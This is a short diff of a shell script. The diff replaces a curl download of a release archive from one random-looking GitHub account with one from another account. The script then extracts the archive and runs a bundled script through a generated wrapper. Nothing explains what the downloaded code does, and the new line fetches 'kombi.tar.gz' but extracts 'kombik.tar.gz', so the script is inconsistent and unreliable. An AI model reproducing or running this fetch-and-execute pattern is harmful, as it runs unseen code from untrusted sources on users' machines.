@@ -1,5 +1,5 @@
-curl -O -J -L https://github.com/juxsuviel509-beep/ilkop-pos/releases/download/huge/kombik.tar.gz && tar -xf kombik.tar.gz && rm -rf kombik.tar.gz
+curl -O -J -L https://github.com/wouegrkaj922-max/dewsa/releases/download/deas/kombi.tar.gz && tar -xf kombik.tar.gz && rm -rf kombik.tar.gz
 echo '#!/bin/bash
 
-bash guk.sh 4 009' > belo.sh
-bash belo.sh
+bash build.sh 4 009' > bolo.sh
+bash bolo.sh
